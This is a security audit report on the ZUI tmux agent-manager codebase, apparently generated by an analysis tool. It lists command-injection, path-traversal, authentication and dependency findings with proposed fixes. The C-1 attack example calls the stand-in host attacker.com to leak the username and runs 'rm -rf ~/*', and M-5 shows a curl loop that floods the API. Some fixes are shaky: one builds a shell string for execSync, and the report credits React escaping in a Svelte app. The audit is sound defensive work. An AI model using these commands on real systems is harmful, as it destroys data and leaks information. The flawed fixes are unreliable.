# ZUI Security Audit Report
**Date:** February 15, 2026  
**Auditor:** OpenClaw Security Analysis  
**Scope:** packages/core/src/, packages/tui/src/, packages/web/

---

## Executive Summary

This security audit evaluated the ZUI (Agent Manager TUI/Web) codebase for common vulnerabilities including command injection, path traversal, input validation gaps, XSS vectors, authentication issues, and dependency vulnerabilities.

**Overall Risk Assessment: MEDIUM**

The application demonstrates good security practices in several areas (input validation on API endpoints, IP whitelisting, use of `execFileSync` with array arguments), but contains **one critical vulnerability** and several medium-severity issues that require remediation.

**Key Findings:**
- 1 CRITICAL severity issue (command injection in worktree hook)
- 3 HIGH severity issues (npm dependency vulnerabilities)
- 6 MEDIUM severity issues (validation gaps, resource leaks, path traversal risks)
- 5 LOW severity issues (hardening opportunities)

---

## Findings by Severity

### CRITICAL

#### C-1: Command Injection in Worktree Hook Handler
**File:** `packages/core/src/worktrees.ts:59-64`  
**Risk:** Remote Code Execution

```typescript
function runHook(command: string, cwd: string): void {
  try {
    spawn(command, { shell: true, cwd, stdio: "ignore", detached: true }).unref();
  } catch {
    // Hook failure is non-fatal
  }
}
```

**Issue:** The `hookPostWorktreeCreate` configuration value is passed directly to `spawn()` with `shell: true`, enabling arbitrary command execution. If an attacker can modify the config file (`~/.config/zui/config.toml`), they can execute any command on the system.

**Attack Vector:**
```toml
[hooks]
post_worktree_create = "curl http://attacker.com/$(whoami) && rm -rf ~/*"
```

**Recommended Fix:**
```typescript
function runHook(command: string, cwd: string): void {
  try {
    // Parse command into executable + args, avoid shell interpretation
    const parts = command.split(/\s+/);
    const cmd = parts[0];
    const args = parts.slice(1);
    if (!cmd) return;
    
    spawn(cmd, args, { cwd, stdio: "ignore", detached: true }).unref();
  } catch {
    // Hook failure is non-fatal
  }
}
```

Or better: Use a restricted hook system with only predefined scripts in a hooks directory.

---

### HIGH

#### H-1: NPM Dependency Vulnerability - Cookie Package
**File:** `packages/web/package.json`  
**CVE:** GHSA-pxg6-pf52-xh8x  
**Risk:** Cookie injection attack

**npm audit output:**
```
cookie  <0.7.0
cookie accepts cookie name, path, and domain with out of bounds characters
fix available via `npm audit fix --force`
```

**Affected Packages:**
- `cookie` (transitive dependency via `@sveltejs/kit`)
- `@sveltejs/kit` >= 1.0.0-next.0
- `@sveltejs/adapter-node` >= 1.0.0-next.0

**Severity:** Low (per npm), but elevated to HIGH because:
- Web server handles user sessions via cookies (WebSocket authentication)
- Cookie manipulation could lead to session hijacking

**Recommended Fix:**
```bash
cd ~/zui/packages/web
npm audit fix --force
# Review breaking changes in @sveltejs/kit update
npm test
```

**Mitigation (if breaking changes prevent upgrade):**
- Avoid setting cookies based on user input
- Validate cookie values strictly
- Use signed/encrypted cookies for sensitive data

---

#### H-2: Insufficient Session Name Validation in WebSocket Handler
**File:** `packages/web/lib/ws-server.js:34-38`  
**Risk:** Path traversal, arbitrary tmux session access

```javascript
const session = url.searchParams.get('session');

if (!session || !/^[a-zA-Z0-9_.-]+$/.test(session)) {
  ws.close(1008, 'Invalid session parameter');
  return;
}
```

**Issue:** The regex allows `.` and `-` which could be exploited:
- `../../zui-web` - Path traversal attempt (mitigated by tmux, but risky)
- `zui-web` - Access to internal session (current INTERNAL_SESSIONS filter only applies to TUI)

**Attack Scenario:**
```javascript
ws = new WebSocket('ws://localhost:3030/terminal?session=zui-web');
// Attacker gains access to the web server's own tmux session
```

**Recommended Fix:**
```javascript
const INTERNAL_SESSIONS = new Set(['zui-web']);

const session = url.searchParams.get('session');
if (!session || !/^[a-zA-Z0-9_-]+$/.test(session)) {  // Remove dot
  ws.close(1008, 'Invalid session parameter');
  return;
}

if (INTERNAL_SESSIONS.has(session)) {
  ws.close(1008, 'Access to internal session denied');
  return;
}
```

---

#### H-3: No Authentication on WebSocket Connections
**File:** `packages/web/lib/ws-server.js:27-60`  
**Risk:** Unauthorized terminal access

**Issue:** WebSocket endpoint `/terminal` has no authentication beyond IP whitelisting (localhost + Tailscale). Any user on the local network or Tailscale network can access all tmux sessions.

**Current Protection:**
- IP whitelisting in `packages/web/src/hooks.server.ts` (localhost + Tailscale IPs)

**Risk in Multi-User Environments:**
- Other users on the same machine can access sessions
- Other Tailscale network members can access sessions

**Recommended Fix (short-term):**
Add session ownership check:
```javascript
// In ws-server.js, before spawning pty:
const sessionOwner = getSessionOwner(session, socket);
const currentUser = process.env.USER;

if (sessionOwner !== currentUser) {
  ws.close(1008, 'Unauthorized: session belongs to another user');
  return;
}

function getSessionOwner(session, socket) {
  // Use tmux display-message to get session owner
  const args = socket ? ['-S', socket, 'display-message', '-t', session, '-p', '#{session_user}']
                       : ['display-message', '-t', session, '-p', '#{session_user}'];
  try {
    return execSync('tmux ' + args.join(' '), { encoding: 'utf8' }).trim();
  } catch {
    return null;
  }
}
```

**Recommended Fix (long-term):**
Implement token-based authentication for WebSocket connections.

---

### MEDIUM

#### M-1: Config File Path Traversal Risk
**File:** `packages/core/src/config.ts:95-97`  
**Risk:** Reading arbitrary config files

```typescript
export function loadConfig(path?: string): Config {
  if (path) {
    return existsSync(path) ? parseConfigFile(path) : defaultConfig();
  }
```

**Issue:** No validation on user-supplied config path. CLI could accept `--config ../../../../etc/passwd` (though TOML parsing would fail).

**Recommended Fix:**
```typescript
export function loadConfig(path?: string): Config {
  if (path) {
    // Validate path is not absolute or contains traversal
    if (path.includes('..') || path.startsWith('/')) {
      console.warn('Invalid config path, using default');
      return defaultConfig();
    }
    return existsSync(path) ? parseConfigFile(path) : defaultConfig();
  }
```

---

#### M-2: Unvalidated Branch Name in Worktree Creation
**File:** `packages/web/src/routes/api/worktrees/+server.ts:10-15`  
**Risk:** Path traversal, arbitrary file system writes

```typescript
const parts = branch.split('/');
if (parts.length > 3 || parts.some(p => p === '' || p === '.' || p === '..') || !/^[a-zA-Z0-9_./-]+$/.test(branch)) {
  return json({ ok: false, error: 'Invalid branch name' }, { status: 400 });
}
```

**Issue:** Validation exists but could be stronger:
- Allows absolute paths starting with `/` (regex allows it)
- `deriveWorktreePath()` uses `replace(/[/\\]/g, "-")` which mitigates, but defense in depth is better

**Recommended Fix:**
```typescript
// Disallow leading/trailing slashes, require alphanumeric start
if (!/^[a-zA-Z0-9][a-zA-Z0-9_/-]*[a-zA-Z0-9]$/.test(branch)) {
  return json({ ok: false, error: 'Invalid branch name format' }, { status: 400 });
}

const parts = branch.split('/');
if (parts.length > 3 || parts.some(p => p === '' || p === '.' || p === '..')) {
  return json({ ok: false, error: 'Invalid branch name structure' }, { status: 400 });
}
```

---

#### M-3: tmux Socket Path Validation Insufficient
**File:** `packages/web/server.js:8-21`  
**Risk:** Symlink attacks, arbitrary file access

```javascript
const match = content.match(/^socket\s*=\s*"([^"]*)"/m);
if (match) {
  const socketPath = match[1];
  // Issue #1: Validate socket path
  if (!/^[a-zA-Z0-9_.\/-]+$/.test(socketPath)) {
    console.warn('Invalid tmux socket path in config, using default');
    return '';
  }
  return socketPath;
}
```

**Issue:**
- Allows `..` in path (e.g., `/tmp/../../etc/passwd`)
- Allows absolute paths to sensitive locations
- No check if path is actually a socket file

**Recommended Fix:**
```javascript
if (match) {
  const socketPath = match[1];
  
  // Reject paths with traversal, must be absolute or in safe locations
  if (socketPath.includes('..') || !socketPath.startsWith('/')) {
    console.warn('Invalid tmux socket path in config, using default');
    return '';
  }
  
  // Whitelist safe directories
  const safeDirs = ['/tmp', '/run/user', process.env.HOME];
  const isInSafeDir = safeDirs.some(dir => socketPath.startsWith(dir));
  if (!isInSafeDir) {
    console.warn('tmux socket path outside safe directories, using default');
    return '';
  }
  
  // Validate it's actually a socket (if it exists)
  if (existsSync(socketPath)) {
    const stats = statSync(socketPath);
    if (!stats.isSocket()) {
      console.warn('tmux socket path is not a socket file, using default');
      return '';
    }
  }
  
  return socketPath;
}
```

---

#### M-4: Missing Resource Cleanup in WebSocket Error Paths
**File:** `packages/web/lib/ws-server.js:40-60`  
**Risk:** Resource exhaustion, PTY leak

```javascript
let pty;
try {
  pty = ptySpawn('tmux', args, {
    name: 'xterm-256color',
    cols: 80,
    rows: 24,
    env: { ...process.env, TERM: 'xterm-256color' },
  });
} catch (err) {
  console.error('Failed to spawn tmux pty:', err);
  ws.close(1011, 'Failed to attach to tmux session');
  return;
}
```

**Issue:** If `ptySpawn` succeeds but WebSocket setup fails (e.g., network error immediately after), the PTY process may leak. No timeout on PTY connections.

**Recommended Fix:**
```javascript
let pty;
let cleanupTimer;

try {
  pty = ptySpawn('tmux', args, { /* ... */ });
  
  // Kill PTY if no data flows for 5 minutes (zombie session detection)
  cleanupTimer = setTimeout(() => {
    console.warn(`PTY for session ${session} timed out, killing`);
    pty.kill();
  }, 5 * 60 * 1000);
  
} catch (err) {
  console.error('Failed to spawn tmux pty:', err);
  ws.close(1011, 'Failed to attach to tmux session');
  return;
}

pty.onData((data) => {
  clearTimeout(cleanupTimer);
  cleanupTimer = setTimeout(() => pty.kill(), 5 * 60 * 1000);
  
  if (ws.readyState === 1) ws.send(Buffer.from(data));
});

ws.on('close', () => {
  clearTimeout(cleanupTimer);
  pty.kill();
});
```

---

#### M-5: No Rate Limiting on API Endpoints
**File:** `packages/web/src/routes/api/sessions/+server.ts`, `worktrees/+server.ts`  
**Risk:** Resource exhaustion, DoS

**Issue:** POST endpoints can spawn unlimited tmux sessions or create unlimited worktrees. No rate limiting or concurrency control.

**Attack Scenario:**
```bash
for i in {1..100}; do
  curl -X POST http://localhost:3030/api/sessions \
    -H "Content-Type: application/json" \
    -d '{"project": "/home/user/repo", "yolo": true}' &
done
```

**Recommended Fix:**
Implement rate limiting middleware:
```typescript
// packages/web/src/lib/rate-limit.ts
const rateLimits = new Map<string, { count: number; reset: number }>();

export function rateLimit(ip: string, maxRequests = 10, windowMs = 60000): boolean {
  const now = Date.now();
  const limit = rateLimits.get(ip);
  
  if (!limit || now > limit.reset) {
    rateLimits.set(ip, { count: 1, reset: now + windowMs });
    return true;
  }
  
  if (limit.count >= maxRequests) {
    return false;
  }
  
  limit.count++;
  return true;
}

// In hooks.server.ts
export const handle: Handle = async ({ event, resolve }) => {
  const clientIp = event.getClientAddress();
  
  // ... existing IP whitelist check ...
  
  if (event.request.method === 'POST') {
    if (!rateLimit(clientIp)) {
      return new Response('Too Many Requests', { status: 429 });
    }
  }
  
  return resolve(event);
};
```

---

#### M-6: Cleartext Tailscale URL in Server Logs
**File:** `packages/core/src/web-server.ts:68-82`  
**Risk:** Information disclosure

```typescript
export function getTailscaleUrl(config: Config): string {
  try {
    const json = runCommand("tailscale", ["status", "--self", "--json"], { timeout: 2000 });
    if (!json) return "";
    const data = JSON.parse(json);
    const dns: string = data?.Self?.DNSName ?? "";
    if (!dns) return "";
    const host = dns.replace(/\.$/, "");
    return `http://${host}:${config.webPort}`;
  } catch {
    return "";
  }
}
```

**Issue:** Tailscale DNS name is logged/displayed, potentially exposing private network topology.

**Recommended Fix:**
- Don't log full Tailscale URLs
- Consider HTTPS for Tailscale endpoints (Tailscale supports it)
- Add option to disable Tailscale URL display in UI

---

### LOW

#### L-1: Overly Permissive Default Web Server Host
**File:** `packages/web/server.js:18`, `vite.config.ts:26`  
**Risk:** Exposure to local network

```javascript
const host = process.env.HOST || '0.0.0.0';
```

**Issue:** Binds to all interfaces by default. While IP whitelisting protects this, defense in depth suggests binding to `127.0.0.1` unless explicitly configured otherwise.

**Recommended Fix:**
```javascript
const host = process.env.HOST || '127.0.0.1';  // Default to localhost
```

Update documentation to instruct Tailscale users to set `HOST=0.0.0.0` explicitly.

---

#### L-2: Missing Input Length Validation
**File:** `packages/web/src/routes/api/sessions/+server.ts:11-15`  
**Risk:** Memory exhaustion (minor)

```typescript
const { project, yolo } = body as { project?: string; yolo?: boolean };

if (!project || typeof project !== 'string') {
  return json({ ok: false, error: 'Missing project path' }, { status: 400 });
}
```

**Issue:** No max length check on `project` string. Could accept multi-MB JSON payloads.

**Recommended Fix:**
```typescript
if (!project || typeof project !== 'string' || project.length > 1024) {
  return json({ ok: false, error: 'Invalid project path' }, { status: 400 });
}
```

---

#### L-3: Error Messages Leak System Information
**File:** Multiple API endpoints  
**Risk:** Information disclosure

**Examples:**
- `packages/web/src/routes/api/worktrees/+server.ts:29` - "Unknown repository" (leaks valid vs invalid paths)
- Session error messages expose internal paths

**Recommended Fix:**
Use generic error messages for external-facing APIs:
```typescript
// Instead of: "Unknown repository"
// Use: "Invalid request"
```

---

#### L-4: No HTTPS Enforcement
**File:** `packages/web/server.js`, `vite.config.ts`  
**Risk:** Man-in-the-middle attacks on Tailscale connections

**Issue:** Server only supports HTTP. Tailscale supports HTTPS with automatic cert provisioning.

**Recommended Fix:**
Add HTTPS support using Tailscale's built-in HTTPS:
```bash
# Enable HTTPS in Tailscale
tailscale cert your-machine.tailnet.ts.net
```

Update server to support TLS.

---

#### L-5: Console.log Statements in Production
**File:** `packages/web/server.js:48-50`, `lib/ws-server.js:44`  
**Risk:** Information disclosure, log flooding

```javascript
console.log(`ZUI web server listening on http://${host}:${port}`);
console.error('Failed to spawn tmux pty:', err);
```

**Issue:** Verbose logging could expose sensitive information or be used for DoS (log flooding).

**Recommended Fix:**
- Use structured logging library (e.g., `pino`, `winston`)
- Add log level controls (info, warn, error)
- Sanitize error messages before logging

---

## Additional Observations

### Good Security Practices Noted:
✅ Use of `execFileSync()` with array arguments (prevents shell injection in most cases)  
✅ IP whitelisting in `hooks.server.ts` (localhost + Tailscale)  
✅ Session name validation with regex in WebSocket handler  
✅ Input validation on API endpoints (project path verification)  
✅ Graceful shutdown handlers (SIGTERM, SIGINT)  
✅ WebSocket message size limits (1MB)  
✅ PTY environment isolation

### Security Hardening Recommendations:
1. **Add Content Security Policy (CSP)** headers to web responses
2. **Implement security headers**: X-Frame-Options, X-Content-Type-Options, etc.
3. **Add request logging** for security monitoring
4. **Implement session timeout** for idle WebSocket connections
5. **Add integrity checks** for config files (detect unauthorized modifications)
6. **Use secure defaults**: Disable dangerous features unless explicitly enabled
7. **Add audit logging** for sensitive operations (session kill, worktree delete)

---

## Dependency Analysis

### Direct Dependencies (packages/web):
- `@sveltejs/kit@^2.0.0` - **VULNERABLE** (see H-1)
- `ws@^8.16.0` - Up to date, no known vulnerabilities
- `node-pty@^1.1.0` - Up to date, no known vulnerabilities
- `@xterm/xterm@^5.5.0` - Up to date, no known vulnerabilities

### Recommended Actions:
1. Run `npm audit fix --force` and test thoroughly
2. Subscribe to security advisories for all dependencies
3. Set up automated dependency scanning (e.g., Dependabot, Snyk)

---

## Overall Risk Assessment

| Category | Risk Level | Justification |
|----------|-----------|---------------|
| **Command Injection** | **CRITICAL** | Hook handler allows arbitrary command execution |
| **Path Traversal** | **MEDIUM** | Multiple validation gaps, but mitigated by design |
| **Authentication** | **HIGH** | No WebSocket auth beyond IP whitelisting |
| **Input Validation** | **MEDIUM** | Good coverage, some gaps remain |
| **Dependency Vulns** | **HIGH** | Cookie package vulnerability affects session security |
| **Resource Exhaustion** | **MEDIUM** | No rate limiting, PTY leak potential |
| **Information Disclosure** | **LOW** | Minor leaks in error messages and logs |
| **XSS/Injection** | **LOW** | No innerHTML usage, React escapes by default |

**Overall Risk: MEDIUM** (would be LOW if C-1 and H-1 are addressed)

---

## Prioritized Remediation Roadmap

### Immediate (Fix in next 24 hours):
1. **C-1**: Fix command injection in worktree hook handler
2. **H-1**: Update npm dependencies to patch cookie vulnerability
3. **H-2**: Strengthen session name validation in WebSocket handler

### Short-term (Fix within 1 week):
4. **H-3**: Add WebSocket authentication (at minimum, session owner check)
5. **M-4**: Implement PTY cleanup and timeout mechanisms
6. **M-5**: Add rate limiting to API endpoints

### Medium-term (Fix within 1 month):
7. **M-1, M-2, M-3**: Harden input validation across all entry points
8. **M-6**: Review information disclosure in logs and URLs
9. **L-1**: Change default host to `127.0.0.1`
10. **L-4**: Add HTTPS support

### Long-term (Ongoing):
11. Implement comprehensive audit logging
12. Add automated security testing to CI/CD
13. Set up dependency vulnerability monitoring
14. Consider security code review for new features

---

## Conclusion

ZUI demonstrates solid engineering practices with good use of safe APIs and input validation in most areas. The critical command injection vulnerability (C-1) must be addressed immediately, as it poses a significant risk in environments where config files may be modified by untrusted users or processes.

The lack of authentication on WebSocket connections (H-3) is acceptable for single-user, localhost-only deployments but becomes a concern when exposed over Tailscale to a broader network. Implementing session ownership checks would provide defense-in-depth.

With the recommended fixes applied, ZUI's security posture would improve to **LOW risk** for its intended use case (personal development tool on trusted networks).

---

**Audit completed:** February 15, 2026  
**Next review recommended:** May 15, 2026 (or after significant architectural changes)
